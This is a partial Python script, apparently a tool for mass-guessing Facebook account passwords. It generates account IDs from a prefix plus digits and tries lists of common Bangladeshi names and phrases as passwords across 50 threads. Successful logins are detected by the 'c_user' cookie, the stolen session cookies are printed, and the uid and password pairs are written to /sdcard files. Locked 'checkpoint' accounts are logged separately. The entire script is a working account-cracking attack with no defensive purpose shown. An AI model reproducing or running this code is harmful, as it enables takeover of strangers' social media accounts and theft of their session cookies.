...
logo = ("""
 ...
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mRAFI CHOWDHURY            \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34m RAFI CHOWDHURY \033[1;93m|
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f" \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
        for love in user:
            pwx = [love+kode+code+'shakil','saiful','rahman','mamum','Bangladesh','free fire','xxxxxx']
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [RIYAZUL-OK💉] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🍪= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/RIYAZUL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [RIYAZUL-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/RIYAZUL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}RIYAZUL-VAI{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
